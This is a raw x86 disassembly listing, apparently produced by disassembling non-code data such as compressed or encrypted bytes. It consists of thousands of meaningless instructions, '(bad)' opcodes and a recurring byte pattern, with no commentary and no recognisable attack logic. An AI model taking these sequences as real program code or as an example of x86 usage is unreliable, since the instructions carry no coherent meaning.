  41e34e:	jae    0x41e3a4
  41e350:	outs   dx,BYTE PTR ds:[esi]
  41e351:	lahf   
  41e352:	call   0x3c3e:0x1f054245
  41e359:	mov    BYTE PTR [ecx-0x72],ch
  41e35c:	ins    BYTE PTR es:[edi],dx
  41e35d:	xchg   ebp,eax
  41e35e:	retf   0x40f9
  41e361:	in     al,0xfc
  41e363:	mul    ah
  41e365:	sub    ch,BYTE PTR [edx+0x398179cf]
  41e36b:	aam    0xa6
  41e36d:	cld    
  41e36e:	hlt    
  41e36f:	int3   
  41e370:	add    DWORD PTR [eax+0x3e],eax
  41e373:	lods   al,BYTE PTR ds:[esi]
  41e374:	xor    ebx,DWORD PTR [edi-0x66a94ea3]
  41e37a:	mov    ch,0xa0
  41e37c:	sbb    ebp,DWORD PTR [ecx+ebx*4-0x42]
  41e380:	scas   al,BYTE PTR es:[edi]
  41e381:	jmp    0xe32972a0
  41e386:	jmp    0xdf2b:0xa28cc65e
  41e38d:	xchg   ebp,eax
  41e38e:	inc    ebp
  41e38f:	mov    dh,BYTE PTR [edx]
  41e391:	stos   BYTE PTR es:[edi],al
  41e392:	jae    0x41e393
  41e394:	ins    BYTE PTR es:[edi],dx
  41e395:	mov    ebp,0x7ba51576
  41e39a:	push   es
  41e39b:	in     al,0xab
  41e39d:	stos   BYTE PTR es:[edi],al
  41e39e:	scas   al,BYTE PTR es:[edi]
  41e39f:	inc    esp
  41e3a0:	mov    edx,esp
  41e3a2:	push   edx
  41e3a3:	outs   dx,BYTE PTR ds:[esi]
  41e3a4:	adc    eax,0x6b88a1f3
  41e3a9:	sub    BYTE PTR [ebx-0x5759213d],dl
  41e3af:	imul   edi,DWORD PTR [edx-0x5bc7da30],0x2f
  41e3b6:	xor    ch,BYTE PTR [ebx-0x595f13d2]
  41e3bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3bd:	inc    ecx
  41e3be:	mov    esp,?
  41e3c0:	or     al,0x9f
  41e3c2:	inc    eax
  41e3c3:	jl     0x41e443
  41e3c5:	iret   
  41e3c6:	or     al,0xfa
  41e3c8:	sub    al,0x53
  41e3ca:	outs   dx,DWORD PTR ds:[esi]
  41e3cb:	or     al,BYTE PTR [ebx-0x3f]
  41e3ce:	fcom   QWORD PTR [ecx-0x16]
  41e3d1:	jo     0x41e416
  41e3d3:	fist   WORD PTR [edx+0x2f043291]
  41e3d9:	xor    eax,0x580ab9ce
  41e3de:	sub    ebx,ebx
  41e3e0:	stc    
  41e3e1:	outs   dx,BYTE PTR ds:[esi]
  41e3e2:	iret   
  41e3e3:	mov    eax,0x63429210
  41e3e8:	test   BYTE PTR [esi-0x1],0xbc
  41e3ec:	stos   BYTE PTR es:[edi],al
	...
  41e455:	add    BYTE PTR [ecx-0xe088ee],cl
  41e45b:	jg     0x41e446
  41e45d:	xchg   esi,eax
  41e45e:	or     DWORD PTR [edx+0x18],0xf1013b09
  41e465:	pusha  
  41e466:	stc    
  41e467:	inc    esp
  41e468:	add    DWORD PTR [eax],eax
  41e46a:	inc    DWORD PTR [eax]
  41e46c:	add    BYTE PTR [eax],al
  41e46e:	bound  ebp,QWORD PTR [edi+0x5b]
  41e471:	push   ecx
  41e472:	adc    bl,bl
  41e474:	dec    ecx
  41e475:	je     0x41e40a
  41e477:	pop    ecx
  41e479:	jbe    0x41e46e
  41e47b:	ror    BYTE PTR [eax],0x5a
  41e47e:	fadd   QWORD PTR [eax]
  41e480:	or     BYTE PTR [ecx-0x5524b3e1],al
  41e486:	ret    0xea4a
  41e489:	adc    al,0x9c
  41e48b:	mov    eax,0xbe39f067
  41e490:	std    
  41e491:	sbb    BYTE PTR [edx],al
  41e493:	jne    0x41e437
  41e495:	sub    BYTE PTR [eax+0x4e27cc7b],dh
  41e49b:	mov    eax,0x3ec1abf6
  41e4a0:	mov    bl,0x9e
  41e4a2:	ret    0x2cb
  41e4a5:	xor    al,0x1a
  41e4a7:	xor    al,0x47
  41e4a9:	push   ecx
  41e4aa:	cmc    
  41e4ab:	cs jle 0x41e509
  41e4ae:	enter  0x182c,0x14
  41e4b2:	fisttp QWORD PTR [esi-0x47e4ab6c]
  41e4b8:	mov    ch,0x99
  41e4ba:	ror    DWORD PTR [edx],cl
  41e4bc:	jle    0x41e527
  41e4be:	sub    BYTE PTR [edi+ecx*2-0xe],0xdb
  41e4c3:	and    eax,0xd063989
  41e4c8:	aaa    
  41e4c9:	pop    ebp
  41e4ca:	ss inc esp
  41e4cc:	clc    
  41e4cd:	sub    esp,eax
  41e4cf:	icebp  
  41e4d0:	in     eax,dx
  41e4d1:	imul   DWORD PTR [edi-0x3e]
  41e4d4:	leave  
  41e4d5:	push   esi
  41e4d6:	cdq    
  41e4d7:	daa    
  41e4d8:	inc    ax
  41e4da:	xor    eax,0xc12e0318
  41e4df:	mov    es,WORD PTR [esi+0x1]
  41e4e2:	inc    edx
  41e4e3:	mov    ebp,0x3845253c
  41e4e8:	jle    0x41e4db
  41e4ea:	xor    ch,BYTE PTR [edi-0x4bb4456b]
  41e4f0:	rep lods eax,DWORD PTR ds:[esi]
  41e4f2:	mov    edi,0x20adb288
  41e4f7:	sub    ch,BYTE PTR [edi+ebx*1]
  41e4fa:	retf   0xc471
  41e4fd:	iret   
  41e4fe:	inc    ecx
  41e4ff:	mov    ah,0xa2
  41e501:	test   al,0x23
  41e503:	xor    al,ah
  41e505:	(bad)  
  41e506:	repz jns 0x41e4a8
  41e509:	ret    
  41e50a:	icebp  
  41e50b:	adc    eax,0x4f970d9b
  41e510:	sbb    edi,DWORD PTR [edi]
  41e512:	jmp    0x93188673
  41e517:	adc    dh,ah
  41e519:	sbb    al,0x41
  41e51b:	adc    eax,0xb10b0573
  41e520:	addr16 iret 
  41e522:	sbb    bh,bl
  41e524:	mov    ds:0xc5484c6b,al
  41e529:	dec    esp
  41e52a:	in     eax,dx
  41e52b:	mov    ds:0x8c3979ae,eax
  41e530:	mov    ah,0xf8
  41e532:	jl     0x41e557
  41e534:	in     eax,0x8a
  41e536:	mov    bl,0xd5
  41e538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e539:	sbb    esp,DWORD PTR [ebx-0x6d29b636]
  41e53f:	pusha  
  41e540:	pop    ebx
  41e541:	in     eax,0xa4
  41e543:	push   esi
  41e544:	mov    bl,0xd5
  41e546:	imul   eax,edx,0xffffff86
  41e549:	out    0x26,al
  41e54b:	add    eax,0x28458172
  41e550:	cli    
  41e551:	pop    ebx
  41e552:	push   ss
  41e553:	jb     0x41e4dc
  41e555:	fst    DWORD PTR [edi+0x7ed3413a]
  41e55b:	pop    ds
  41e55c:	dec    ebx
  41e55d:	test   BYTE PTR [edx-0x1ae25141],al
  41e563:	pop    ecx
  41e564:	sub    esi,DWORD PTR [ecx+0x45]
  41e567:	mov    ecx,0xd73a6743
  41e56c:	push   ebp
	...
  41e5d5:	add    BYTE PTR [eax],ah
  41e5d7:	push   0xffffffcb
  41e5d9:	dec    ebx
  41e5da:	retf   
  41e5db:	jmp    0x41e57d
  41e5dd:	imul   ebp,ebx,0xffffffb1
  41e5e0:	aaa    
  41e5e1:	je     0x41e613
  41e5e3:	ds stos BYTE PTR es:[edi],al
  41e5e5:	stos   BYTE PTR es:[edi],al
  41e5e6:	clc    
  41e5e7:	inc    ebp
  41e5e8:	add    DWORD PTR [eax],eax
  41e5ea:	inc    DWORD PTR [eax]
  41e5ec:	add    BYTE PTR [eax],al
  41e5ee:	je     0x41e618
  41e5f0:	idiv   BYTE PTR [ecx]
  41e5f2:	shr    DWORD PTR ds:0x415aac10,cl
  41e5f8:	mov    edx,0xec378b18
  41e5fd:	dec    ebx
  41e5fe:	lods   al,BYTE PTR ds:[esi]
  41e5ff:	cmp    BYTE PTR [edx],0x8f
  41e602:	les    esp,FWORD PTR [esi]
  41e604:	iret   
  41e605:	fwait
  41e606:	ror    BYTE PTR [ecx+0x40],1
  41e609:	dec    ebx
  41e60a:	leave  
  41e60b:	cli    
  41e60c:	inc    eax
  41e60d:	and    eax,esi
  41e60f:	ja     0x41e62e
  41e611:	push   edi
  41e612:	mov    ah,0x80
  41e614:	jae    0x41e5d8
  41e616:	je     0x41e62d
  41e618:	pusha  
  41e619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e61a:	fs fmul st(3),st
  41e61d:	mov    ebp,esp
  41e61f:	mov    eax,0x107567e0
  41e624:	popf   
  41e625:	or     al,0x6
  41e627:	mov    ds:0x2227b038,al
  41e62c:	sub    BYTE PTR [edi+0x55],dl
  41e62f:	push   esi
  41e630:	sub    dh,BYTE PTR [esi-0x1c51e6d6]
  41e636:	adc    al,0x15
  41e638:	shl    BYTE PTR [esi-0x47],0x38
  41e63c:	stos   BYTE PTR es:[edi],al
  41e63d:	stos   BYTE PTR es:[edi],al
  41e63e:	push   ss
  41e63f:	mov    al,ds:0xbfba5f9a
  41e644:	arpl   WORD PTR [eax],sp
  41e646:	cwde   
  41e647:	repz mov bh,0x10
  41e64a:	and    DWORD PTR [edx-0x1f27be4d],esp
  41e650:	push   ecx
  41e651:	out    dx,eax
  41e652:	in     al,0x32
  41e654:	popa   
  41e655:	into   
  41e656:	test   al,0xb4
  41e658:	add    al,0xac
  41e65a:	outs   dx,DWORD PTR ds:[esi]
  41e65b:	pusha  
  41e65c:	xor    BYTE PTR [esi*1+0x26ba3b81],bl
  41e663:	outs   dx,BYTE PTR ds:[esi]
  41e664:	frstor [ecx+eiz*1-0x9]
  41e668:	les    esi,FWORD PTR [edi-0x642747d3]
  41e66e:	push   0x3b9d4dbd
  41e673:	xor    DWORD PTR [esi],ebp
  41e675:	sub    al,0xa1
  41e677:	scas   al,BYTE PTR es:[edi]
  41e678:	pop    esp
  41e679:	retf   
  41e67a:	icebp  
  41e67b:	cmp    eax,0xd75d3c88
  41e680:	sbb    eax,0x15f6370c
  41e685:	retf   0x41c7
  41e688:	lds    edx,FWORD PTR ds:0xc6287a49
  41e68e:	mov    eax,ds:0x69b84b6
  41e693:	pop    edi
  41e694:	jl     0x41e6c9
  41e696:	adc    ah,al
  41e698:	sub    BYTE PTR [esi+eax*8-0x46],0x5b
  41e69d:	mov    ds:0xd619d24c,al
  41e6a2:	or     DWORD PTR [ebx],ebp
  41e6a4:	sbb    eax,0xb39c2b1f
  41e6a9:	ins    DWORD PTR es:[edi],dx
  41e6aa:	icebp  
  41e6ab:	cmp    al,0xc0
  41e6ad:	hlt    
  41e6ae:	nop
  41e6af:	fdivp  st(7),st
  41e6b1:	shl    BYTE PTR [ecx-0x3ad6ba6e],1
  41e6b7:	push   ebx
  41e6b8:	scas   eax,DWORD PTR es:[edi]
  41e6b9:	ret    0x9737
  41e6bc:	lds    eax,FWORD PTR [eax-0x7a836c7b]
  41e6c2:	ret    0xf7d2
  41e6c5:	cli    
  41e6c6:	push   esi
  41e6c7:	stos   BYTE PTR es:[edi],al
  41e6c8:	cmp    al,BYTE PTR [edi-0x80]
  41e6cb:	push   es
  41e6cc:	push   esp
  41e6cd:	aam    0x85
  41e6cf:	(bad)  
  41e6d0:	mov    WORD PTR [edi],fs
  41e6d2:	ret    
  41e6d3:	cld    
  41e6d4:	jl     0x41e714
  41e6d6:	stc    
  41e6d7:	mov    bh,0xa7
  41e6d9:	and    DWORD PTR [eax],ebx
  41e6db:	in     al,0xcc
  41e6dd:	mov    dl,BYTE PTR [eax+0xb]
  41e6e0:	das    
  41e6e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6e3:	pop    esp
  41e6e4:	add    DWORD PTR [edx+0x74],0xffffff90
  41e6e8:	call   0xd466f7d3
	...
  41e755:	add    ch,al
  41e757:	cwde   
  41e758:	loope  0x41e7af
  41e75a:	std    
  41e75b:	jge    0x41e752
  41e75d:	cwde   
  41e75e:	xchg   esp,eax
  41e75f:	push   0x37
  41e761:	sub    ebx,ecx
  41e763:	dec    ecx
  41e764:	add    BYTE PTR [edi+esi*8-0xfffeba],bl
  41e76b:	add    BYTE PTR [eax],al
  41e76d:	add    BYTE PTR [eax],dh
  41e76f:	cwde   
  41e770:	call   0xf53e:0x238052cb
  41e777:	out    dx,al
  41e778:	mov    BYTE PTR [eax+0x6],ch
  41e77b:	mov    cl,BYTE PTR [edi+0x2d]
  41e77e:	mov    dl,BYTE PTR [edi+0x586ce3fd]
  41e784:	pop    ebx
  41e785:	push   ebx
  41e786:	and    esp,ecx
  41e788:	adc    ecx,DWORD PTR [edi]
  41e78a:	loopne 0x41e718
  41e78c:	jge    0x41e790
  41e78e:	out    dx,al
  41e78f:	pop    ecx
  41e790:	ror    DWORD PTR [edi],cl
  41e792:	mov    al,0xd3
  41e794:	jbe    0x41e808
  41e796:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e797:	cmp    cl,BYTE PTR [ebp+0x37c1527]
  41e79d:	jb     0x41e7cc
  41e79f:	inc    ecx
  41e7a0:	xor    BYTE PTR [ebp-0x5],ah
  41e7a3:	xchg   ebp,eax
  41e7a4:	inc    eax
  41e7a5:	adc    al,0x6b
  41e7a7:	inc    esp
  41e7a8:	mov    WORD PTR [eax+0x1dc47c27],es
  41e7ae:	or     eax,0x23540f29
  41e7b3:	jmp    0x68b716d2
  41e7b8:	aad    0x3a
  41e7ba:	push   0x88e868df
  41e7bf:	loopne 0x41e76e
  41e7c1:	inc    edi
  41e7c2:	jecxz  0x41e830
  41e7c4:	mov    ah,0xc3
  41e7c6:	add    BYTE PTR [esi+esi*2+0x1d56db0d],ch
  41e7cd:	inc    ecx
  41e7ce:	or     al,0x88
  41e7d0:	test   DWORD PTR [esi],ebp
  41e7d2:	push   edx
  41e7d3:	dec    edx
  41e7d4:	xor    esp,DWORD PTR [edi-0x190ec973]
  41e7da:	mov    esi,0x6787b3e
  41e7df:	push   es
  41e7e0:	or     cl,ah
  41e7e2:	hlt    
  41e7e3:	push   0x942fa098
  41e7e8:	fucomip st,st(5)
  41e7ea:	pop    edx
  41e7eb:	in     eax,0x71
  41e7ed:	repz push ebx
  41e7ef:	ret    
  41e7f0:	pop    ebx
  41e7f1:	xor    DWORD PTR [eax-0x47],0x6c279fca
  41e7f8:	xor    al,0x5c
  41e7fa:	pop    esi
  41e7fb:	jge    0x41e877
  41e7fd:	ficomp DWORD PTR [ebx+edx*8+0x4d266398]
  41e804:	jg     0x41e86a
  41e806:	mov    dh,dl
  41e808:	pop    eax
  41e809:	pushf  
  41e80a:	or     DWORD PTR [ecx+0x2721a885],ecx
  41e810:	cdq    
  41e811:	mov    ch,0x28
  41e813:	out    dx,eax
  41e814:	jg     0x41e835
  41e816:	outs   dx,DWORD PTR ds:[esi]
  41e817:	rcl    BYTE PTR [esi+0x6a0c2d0c],cl
  41e81d:	adc    esi,eax
  41e81f:	mov    ch,0xed
  41e821:	aaa    
  41e822:	mov    ds:0x743632a2,al
  41e827:	jg     0x41e7ea
  41e829:	sbb    ebx,DWORD PTR ds:[ebx]
  41e82c:	inc    edx
  41e82d:	mov    ds:0x2e52a239,al
  41e832:	xchg   BYTE PTR [edi-0x61],ch
  41e835:	in     al,dx
  41e836:	leave  
  41e837:	inc    edi
  41e838:	fistp  WORD PTR [ebp-0x37346c13]
  41e83e:	mov    eax,0xd558baa4
  41e843:	pop    es
  41e844:	push   ds
  41e845:	cli    
  41e846:	and    al,0x4d
  41e848:	push   es
  41e849:	and    edx,edx
  41e84b:	mov    al,ds:0x58abef55
  41e850:	shl    DWORD PTR [ebp+0x25974532],1
  41e856:	mov    dh,0xe4
  41e858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e859:	push   ecx
  41e85a:	inc    edx
  41e85b:	stos   DWORD PTR es:[edi],eax
  41e85c:	jge    0x41e813
  41e85e:	ret    0xdd84
  41e861:	(bad)  
  41e862:	(bad)  
  41e864:	mov    esp,0xb74fd2aa
  41e869:	mov    dl,0x3b
  41e86b:	inc    BYTE PTR [edx+0x0]
	...
  41e8d6:	sub    eax,0x9e5c8a39
  41e8db:	(bad)  
  41e8dc:	(bad)  
  41e8dd:	jns    0x41e94e
  41e8df:	xor    al,0xcc
  41e8e1:	jg     0x41e955
  41e8e3:	enter  0x6334,0xf6
  41e8e7:	inc    edi
  41e8e8:	add    DWORD PTR [eax],eax
  41e8ea:	inc    DWORD PTR [eax]
  41e8ec:	add    BYTE PTR [eax],al
  41e8ee:	mov    bh,0x33
  41e8f0:	dec    esp
  41e8f1:	pop    edi
  41e8f2:	xlat   BYTE PTR ds:[ebx]
  41e8f3:	dec    ebp
  41e8f4:	mov    dh,0x33
  41e8f6:	push   ebx
  41e8f7:	in     al,0xe6
  41e8f9:	je     0x41e87f
  41e8fb:	adc    cl,dl
  41e8fd:	je     0x41e885
  41e8ff:	sub    ebp,DWORD PTR [edx]
  41e901:	inc    WORD PTR fs:[bx+di]
  41e906:	sbb    DWORD PTR [esi-0xd4e9454],eax
  41e90c:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e90e:	inc    ecx
  41e90f:	mov    dl,BYTE PTR [ebx]
  41e911:	sub    bh,bl
  41e913:	sub    eax,0x16ffd6d7
  41e918:	stc    
  41e919:	jo     0x68f2d2d5
  41e91f:	call   0x95a0b21c
  41e924:	mov    ch,0x59
  41e926:	test   eax,0x519a7b8a
  41e92b:	pop    eax
  41e92c:	sbb    edx,DWORD PTR [ebx+0x3e]
  41e92f:	fistp  WORD PTR [esi-0x1837c19a]
  41e935:	jl     0x41e8e9
  41e937:	call   0xca2f773f
  41e93c:	inc    eax
  41e93d:	cmp    eax,0x828ca6df
  41e942:	mov    ds:0xd0abcb13,eax
  41e947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e948:	(bad)  
  41e949:	jnp    0x41e966
  41e94b:	or     al,0x94
  41e94d:	ror    DWORD PTR [esp+edx*4+0x3e816a9b],0x2c
  41e955:	icebp  
  41e956:	push   eax
  41e957:	loop   0x41e987
  41e959:	stos   BYTE PTR es:[edi],al
  41e95a:	dec    ecx
  41e95b:	rcr    BYTE PTR [edx-0x72],0xa2
  41e95f:	cmp    bh,BYTE PTR [esi-0x50]
  41e962:	jp     0x41e9a8
  41e964:	and    bh,BYTE PTR [ebp-0x263df2a]
  41e96a:	jecxz  0x41e975
  41e96c:	mov    bh,0xc1
  41e96e:	adc    BYTE PTR [ecx],cl
  41e970:	bnd call ebx
  41e973:	and    edi,DWORD PTR [edi+0x23]
  41e976:	mov    al,ds:0xf00e3b2d
  41e97b:	inc    edx
  41e97c:	fdiv   st(3),st
  41e97e:	addr16 push esp
  41e980:	sbb    BYTE PTR [ebx+0x7b],cl
  41e983:	stos   DWORD PTR es:[edi],eax
  41e984:	xchg   DWORD PTR [ebp-0x3d],edi
  41e987:	nop
  41e988:	pop    ss
  41e989:	xchg   edx,eax
  41e98a:	and    ah,BYTE PTR [esi-0x4e1e5946]
  41e990:	fdivrp st(2),st
  41e992:	fld    DWORD PTR [esi+0x6f000229]
  41e998:	mov    ah,0x3d
  41e99a:	pop    ebp
  41e99b:	jle    0x41e9c2
  41e99d:	popa   
  41e99e:	push   0xfffffffd
  41e9a0:	sbb    ecx,DWORD PTR [ebx-0xd]
  41e9a3:	ss loop 0x41e9c9
  41e9a6:	pop    ebp
  41e9a7:	pop    ds
  41e9a8:	mov    al,0x98
  41e9aa:	cmp    cl,0xa8
  41e9ad:	inc    edi
  41e9ae:	jno    0x41e9b0
  41e9b0:	dec    ecx
  41e9b1:	sbb    BYTE PTR ds:0x843a939e,cl
  41e9b7:	pop    ds
  41e9b8:	cs pusha 
  41e9ba:	bound  esi,QWORD PTR [eax+0x3a]
  41e9bd:	push   eax
  41e9be:	out    dx,eax
  41e9bf:	lahf   
  41e9c0:	dec    ebx
  41e9c1:	daa    
  41e9c2:	imul   ebp,DWORD PTR [eax-0x1e],0x7b170dc2
  41e9c9:	fidivr DWORD PTR [ecx-0x36]
  41e9cc:	sub    bh,dh
  41e9ce:	mov    al,ds:0x3be08edd
  41e9d3:	add    BYTE PTR [ebp+0x2e],cl
  41e9d6:	add    ebx,DWORD PTR [edx-0x183a349f]
  41e9dc:	call   DWORD PTR [ebx]
  41e9de:	pop    ebp
  41e9df:	xlat   BYTE PTR ds:[ebx]
  41e9e0:	jo     0x41ea25
  41e9e2:	(bad)  
  41e9e3:	call   edx
  41e9e5:	mov    DWORD PTR [ebp-0x74],eax
  41e9e8:	xchg   ebp,eax
  41e9e9:	add    DWORD PTR [esi+0x2bd4],ebx
	...
  41ea53:	add    BYTE PTR [eax],al
  41ea55:	add    BYTE PTR [eax-0x3],bh
  41ea58:	ret    0xc766
  41ea5b:	jg     0x41ea59
  41ea5d:	dec    DWORD PTR [edi+0x67]
  41ea60:	rol    dl,1
  41ea62:	jecxz  0x41ea96
  41ea64:	lods   eax,DWORD PTR ds:[esi]
  41ea65:	dec    edi
  41ea66:	cmc    
  41ea67:	dec    eax
  41ea68:	add    DWORD PTR [eax],eax
  41ea6a:	inc    DWORD PTR [eax]
  41ea6c:	add    BYTE PTR [eax],al
  41ea6e:	push   esp
  41ea6f:	xor    ecx,DWORD PTR [ecx-0x48414fb1]
  41ea75:	xor    al,0xc4
  41ea77:	push   cs
  41ea78:	jae    0x41ea6e
  41ea7a:	sub    dl,BYTE PTR ds:0xaa4ff729
  41ea80:	pusha  
  41ea81:	imul   esp,DWORD PTR [ecx],0x32
  41ea84:	dec    ebp
  41ea85:	sbb    bh,BYTE PTR [ecx]
  41ea87:	xor    DWORD PTR [ebp-0x3e4f7917],ebx
  41ea8d:	and    al,0x83
  41ea8f:	mov    ah,0x91
  41ea91:	push   eax
  41ea92:	mov    ch,0xe2
  41ea94:	out    dx,al
  41ea95:	adc    DWORD PTR ds:0xf885b9b3,edx
  41ea9b:	repnz sbb BYTE PTR [esi],dh
  41ea9e:	sub    eax,0x30118d06
  41eaa3:	outs   dx,DWORD PTR ds:[esi]
  41eaa4:	test   DWORD PTR [edi],ebp
  41eaa6:	push   esp
  41eaa7:	pop    edi
  41eaa8:	popa   
  41eaa9:	or     bl,BYTE PTR [esi]
  41eaab:	sbb    bh,BYTE PTR ds:0x64356901
  41eab1:	xchg   ecx,eax
  41eab2:	fwait
  41eab3:	loope  0x41ead9
  41eab5:	das    
  41eab6:	mov    cl,0x2c
  41eab8:	push   ebp
  41eab9:	pushf  
  41eaba:	outs   dx,DWORD PTR ds:[esi]
  41eabb:	adc    al,0x8
  41eabd:	sbb    DWORD PTR [edx+0x633c866a],0x8ec71608
  41eac7:	mov    edx,DWORD PTR [esi-0x19]
  41eaca:	pop    eax
  41eacb:	jae    0x41ea80
  41eacd:	scas   eax,DWORD PTR es:[edi]
  41eace:	mov    eax,0xfbb59ddc
  41ead3:	inc    ebp
  41ead4:	js     0x41eae1
  41ead6:	mov    BYTE PTR [ecx+edi*2],ah
  41ead9:	addr16 pop edi
  41eadb:	inc    eax
  41eadc:	add    al,0xdd
  41eade:	cmp    eax,0x6b186e79
  41eae3:	mov    edi,0x2e964d5f
  41eae8:	arpl   WORD PTR [edi-0x173f0f91],dx
  41eaee:	fcomp  QWORD PTR [eax-0x6e1a4901]
  41eaf4:	pop    ss
  41eaf5:	mov    ds:0x40fc1b64,al
  41eafa:	gs mov ah,0xdb
  41eafd:	sbb    bh,BYTE PTR [edi+0x71]
  41eb00:	jl     0x41eaa1
  41eb02:	mov    ecx,0xa0418ac3
  41eb07:	rcr    BYTE PTR [ebp-0x75],cl
  41eb0a:	push   cs
  41eb0b:	repz cld 
  41eb0d:	out    0xed,al
  41eb0f:	xor    al,0x86
  41eb11:	mov    edx,0x8f0fdcce
  41eb16:	add    esp,edx
  41eb18:	scas   al,BYTE PTR es:[edi]
  41eb19:	sahf   
  41eb1a:	pushf  
  41eb1b:	and    esp,0x3f
  41eb1e:	cmp    ecx,DWORD PTR [ecx+0x52d4a0bc]
  41eb24:	and    esi,DWORD PTR [eax-0x54]
  41eb27:	fstp   TBYTE PTR [esi+0x27]
  41eb2a:	pop    ds
  41eb2b:	in     al,0x34
  41eb2d:	(bad)  
  41eb2e:	sbb    bl,dh
  41eb30:	adc    eax,0x68ab5c5d
  41eb35:	mov    ebx,0x8e067109
  41eb3a:	sar    BYTE PTR [edx-0x2d],cl
  41eb3d:	push   esi
  41eb3e:	fnstenv [edx]
  41eb40:	adc    eax,0x6445f40d
  41eb45:	test   esp,edx
  41eb47:	sbb    BYTE PTR [ecx+0x21b16884],al
  41eb4d:	pop    eax
  41eb4e:	mov    BYTE PTR [ebp-0x22049689],dh
  41eb54:	push   ebp
  41eb55:	push   0xffffffea
  41eb57:	add    al,0xe
  41eb59:	(bad)  
  41eb5b:	push   es
  41eb5c:	dec    edi
  41eb5d:	pop    DWORD PTR [ebp+0x51]
  41eb60:	scas   eax,DWORD PTR es:[edi]
  41eb61:	xchg   esp,eax
  41eb62:	les    eax,FWORD PTR [esi+0x7339f2ce]
  41eb68:	dec    ebp
  41eb69:	pop    edx
  41eb6a:	or     ah,dl
  41eb6c:	jmp    0x41eb6e
	...
  41ebd6:	adc    ch,BYTE PTR [edi]
  41ebd8:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41ebdf:	out    0x9b,al
  41ebe1:	aad    0xd5
  41ebe3:	sub    eax,0x49f48751
  41ebe8:	add    DWORD PTR [eax],eax
  41ebea:	inc    DWORD PTR [eax]
  41ebec:	add    BYTE PTR [eax],al
  41ebee:	jmp    0x41ec01
  41ebf0:	add    ebx,DWORD PTR [esi+edx*2-0x21]
  41ebf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebf5:	mov    al,ch
  41ebf7:	add    al,0x45
  41ebf9:	cld    
  41ebfa:	push   eax
  41ebfb:	ret    
  41ebfc:	scas   eax,DWORD PTR es:[edi]
  41ebfd:	aad    0x7e
  41ebff:	inc    esp
  41ec00:	jns    0x41ebe6
  41ec02:	inc    ecx
  41ec03:	inc    esi
  41ec04:	call   0xa909b026
  41ec09:	push   ebp
  41ec0a:	ja     0x41ebf3
  41ec0c:	push   ebx
  41ec0d:	cmp    bl,ah
  41ec0f:	sub    BYTE PTR [ecx+0x44369d33],0x82
  41ec16:	xor    eax,0xeaef9b2a
  41ec1b:	push   edi
  41ec1c:	sti    
  41ec1d:	imul   ecx,esp,0x64
  41ec20:	aaa    
  41ec21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec22:	jl     0x41ebb7
  41ec24:	out    0x8f,al
  41ec26:	sub    DWORD PTR [eax],ebx
  41ec28:	or     dl,BYTE PTR [edi+0x1f5fac4f]
  41ec2e:	mov    ah,0x51
  41ec30:	push   ss
  41ec31:	push   ecx
  41ec32:	sbb    BYTE PTR [eax],0xcc
  41ec35:	or     bh,ah
  41ec37:	jmp    0x41ecb5
  41ec39:	mov    bl,BYTE PTR [esi]
  41ec3b:	inc    edx
  41ec3c:	mov    al,BYTE PTR ds:0xa9a3110e
  41ec42:	dec    esp
  41ec43:	shr    BYTE PTR [edx-0x2e12b1d],0x6e
  41ec4a:	sbb    eax,0x29486eeb
  41ec4f:	and    DWORD PTR [ebp-0x63541068],edx
  41ec55:	pop    es
  41ec56:	(bad)  
  41ec57:	scas   eax,DWORD PTR es:[edi]
  41ec58:	ret    
  41ec59:	pop    esi
  41ec5a:	mov    ah,0xcc
  41ec5c:	je     0x41ecc2
  41ec5e:	rcl    BYTE PTR [ebp-0xe],1
  41ec61:	test   eax,0xde2d006
  41ec66:	xor    esp,DWORD PTR [edi+0x37]
  41ec69:	pushf  
  41ec6a:	jp     0x41ec1a
  41ec6c:	or     BYTE PTR es:[eax-0x1e],cl
  41ec70:	and    esp,DWORD PTR [ecx+ebx*2]
  41ec73:	std    
  41ec74:	inc    edi
  41ec75:	xchg   edx,eax
  41ec76:	mul    si
  41ec79:	cmp    al,0x72
  41ec7b:	or     BYTE PTR [ecx+0x31],ah
  41ec7e:	cmp    eax,0xcb7a0b6a
  41ec83:	icebp  
  41ec84:	xchg   ebx,eax
  41ec85:	cmp    al,0xe0
  41ec87:	adc    eax,0x508d4af
  41ec8c:	ja     0x41ecd0
  41ec8e:	jl     0x41ecb4
  41ec90:	inc    eax
  41ec91:	hlt    
  41ec92:	adc    ecx,esi
  41ec94:	bound  edx,QWORD PTR [ebx+esi*4+0x5f53e75d]
  41ec9b:	xor    eax,0x67e815a
  41eca0:	jecxz  0x41ec83
  41eca2:	xchg   BYTE PTR [edx-0x6f],dl
  41eca5:	or     DWORD PTR [esp+ecx*8],esp
  41eca8:	mov    ah,ah
  41ecaa:	mov    ch,0x58
  41ecac:	test   eax,0xf37c13cf
  41ecb1:	enter  0x1a68,0x88
  41ecb5:	cmp    al,0xe5
  41ecb7:	jecxz  0x41ed2f
  41ecb9:	stos   DWORD PTR es:[edi],eax
  41ecba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecbb:	outs   dx,DWORD PTR ds:[esi]
  41ecbc:	push   esp
  41ecbd:	cld    
  41ecbe:	mov    ch,0xcf
  41ecc0:	inc    ecx
  41ecc1:	mov    ch,0xfb
  41ecc3:	bound  ebp,QWORD PTR [ecx+ecx*2]
  41ecc6:	push   es
  41ecc7:	xlat   BYTE PTR ds:[ebx]
  41ecc8:	cmp    al,BYTE PTR [edi]
  41ecca:	outs   dx,DWORD PTR ds:[esi]
  41eccb:	call   FWORD PTR [edx-0x1b]
  41ecce:	out    0x8a,al
  41ecd0:	add    dh,BYTE PTR [edx-0x7ed3293]
  41ecd6:	mov    eax,0xc5d15442
  41ecdb:	mov    al,ds:0xc64daee6
  41ece0:	pop    DWORD PTR [ebp+0x20]
  41ece3:	cmp    DWORD PTR [edx],edi
